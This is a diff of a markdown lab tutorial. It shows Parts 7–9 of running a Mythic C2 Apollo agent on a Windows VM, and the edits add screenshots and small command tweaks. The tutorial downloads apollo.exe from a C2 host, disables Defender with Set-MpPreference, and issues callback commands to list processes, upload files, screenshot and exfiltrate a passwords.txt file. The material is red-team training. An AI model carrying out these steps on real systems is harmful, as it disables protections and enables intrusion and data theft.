@@ -321,12 +321,14 @@ http://<UBUNTU_IP>:8080/apollo.exe
 ```
  
 Download and save the file.
- 
+
+<img width="1337" height="639" alt="image" src="https://github.com/user-attachments/assets/df0b379f-0a25-4519-88f7-f3f9e6d62415" />
+
 ---
  
 ## Part 7 — Execute the Payload on Windows
- 
->[!NOTE]
+
+ >[!NOTE]
 > Windows Defender will flag and delete this file. You need to either disable Defender on your lab VM or add an exclusion for the folder where you saved the file. This is expected in a lab environment.
  
 Disable Defender on Windows (lab only — do not do this on real machines):
@@ -336,33 +338,42 @@ Open PowerShell as Administrator and run:
 ```powershell
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```
- 
+
 Now run the payload:
  
 ```powershell
+cd Downloads
 .\apollo.exe
 ```
  
 Switch back to the Mythic web UI. Under **Callbacks**, you will see a new entry appear within a few seconds. This is the Windows machine calling back to your EC2 C2 server.
- 
+
+<img width="1919" height="684" alt="image" src="https://github.com/user-attachments/assets/9ee48bc7-592e-4d73-97dc-064c7a876f45" />
+
 ---
  
 ## Part 8 — Interact with the Callback
  
 Click on the callback row in the UI. A task panel opens at the bottom.
+
+<img width="914" height="994" alt="image" src="https://github.com/user-attachments/assets/f1dfbc1d-e03c-45cb-a118-9f4c857bc371" />
  
 ### List files
  
 ```
 ls C:\Users
 ```
- 
+
+<img width="1917" height="994" alt="image" src="https://github.com/user-attachments/assets/2b66c5f4-3328-42b6-b0de-dadb3b5926f3" />
+
 ### List running processes
  
 ```
 ps
 ```
- 
+
+<img width="1864" height="963" alt="image" src="https://github.com/user-attachments/assets/9afac5a4-8430-408c-ba8c-310429761db0" />
+
 You will see a full list of running processes, their PIDs, parent PIDs, and process paths. This is exactly what a threat actor would use to look for AV processes, browsers with saved credentials, or privileged processes to migrate into.
  
 ### Get current user and hostname
@@ -372,7 +383,9 @@ shell whoami
 shell hostname
 shell ipconfig
 ```
- 
+
+<img width="1107" height="442" alt="image" src="https://github.com/user-attachments/assets/4bfc11e5-ee60-4554-80fa-a3b09d39bc5e" />
+
 Each `shell` command runs the argument in `cmd.exe` and returns the output.
  
 ### Upload a file
@@ -380,7 +393,9 @@ Each `shell` command runs the argument in `cmd.exe` and returns the output.
 ```
 upload
 ```
- 
+
+<img width="1537" height="790" alt="image" src="https://github.com/user-attachments/assets/2a0e6182-5000-463e-a1e9-6db0b19894ce" />
+
 Mythic will prompt you to select a file from your local machine. The agent receives it and writes it to disk on the Windows target.
  
 ### Download a file from the target
@@ -388,7 +403,7 @@ Mythic will prompt you to select a file from your local machine. The agent recei
 ```
 download C:\Users\<username>\Desktop\passwords.txt
 ```
- 
+
 If that file exists, Mythic will pull it back to the EC2 server and it will appear under **Files** in the UI.
  
 ### Get a screenshot
@@ -396,9 +411,11 @@ If that file exists, Mythic will pull it back to the EC2 server and it will appe
 ```
 screenshot
 ```
- 
+
+<img width="1803" height="987" alt="image" src="https://github.com/user-attachments/assets/a314e1ed-9f92-47f4-9497-7a5b3c7a815a" />
+
 Apollo captures the current screen of the Windows machine and sends it back. It appears under **Files**.
- 
+
 ---
  
 ## Part 9 — What does this look like on the network?
